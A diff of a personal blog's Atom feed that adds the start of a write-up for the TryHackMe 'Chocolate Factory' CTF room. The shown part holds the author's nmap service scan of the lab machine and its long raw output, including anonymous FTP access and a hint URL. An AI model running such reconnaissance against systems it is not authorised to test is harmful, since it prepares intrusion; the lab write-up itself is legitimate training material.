@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/ctf/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-01-06T22:52:56+00:00</updated>
+  <updated>2021-01-20T21:36:18+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/ctf/feed.xml</id>
 
   
@@ -30,6 +30,897 @@
   
   
 
+  
+    <entry>
+      <title type="html">Chocolate Factory CTF Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/chocolatefactory" rel="alternate" type="text/html" title="Chocolate Factory CTF Write Up" />
+      <published>2021-01-20T00:00:00+00:00</published>
+      <updated>2021-01-20T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/chocolatefactory</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/chocolatefactory">&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/cover.png&quot; alt=&quot;chocolatefactory&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/chocolatefactory&quot;&gt;Chocolate Factory&lt;/a&gt; is a easy CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa&lt;/p&gt;
+
+  &lt;p&gt;This is a beginner friendly room!&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.224.249 I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.224.249                                               
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 20:33 GMT
+Nmap scan report for 10.10.224.249                             
+Host is up (0.028s latency).                                   
+Not shown: 989 closed ports                                    
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 3.0.3
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:{Attacker IP}
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ssh-hostkey: 
+|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
+|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
+|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
+80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+100/tcp open  newacct?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+106/tcp open  pop3pw?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+109/tcp open  pop2?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+110/tcp open  pop3?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+111/tcp open  rpcbind?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+113/tcp open  ident?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, GetRequest, Help, LDAPSearchReq, NULL, TLSSessionReq, TerminalServerCookie, X11Probe: 
+|_    http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+119/tcp open  nntp?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+125/tcp open  locus-map?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port100-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port106-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port109-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port110-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port111-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(RPCCh
+SF:eck,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20
+SF:___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\
+SF:x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\
+SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20
+SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__
+SF:\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\
+SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\
+SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;----------------
+SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x
+SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_______
+SF:_______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x2
+SF:0Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2
+SF:0;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port113-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\
+SF:x20key\x20here!!!\n&quot;)%r(GenericLines,3E,&quot;http://localhost/key_rev_key\x
+SF:20&amp;lt;-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n&quot;)%r(GetRequest,3
+SF:E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\x20
+SF:key\x20here!!!\n&quot;)%r(Help,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You
+SF:\x20will\x20find\x20the\x20key\x20here!!!\n&quot;)%r(TerminalServerCookie,3E
+SF:,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\x20k
+SF:ey\x20here!!!\n&quot;)%r(TLSSessionReq,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;
+SF:-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n&quot;)%r(X11Probe,3E,&quot;ht
+SF:tp://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\x20key\x
+SF:20here!!!\n&quot;)%r(LDAPSearchReq,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x2
+SF:0You\x20will\x20find\x20the\x20key\x20here!!!\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port119-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
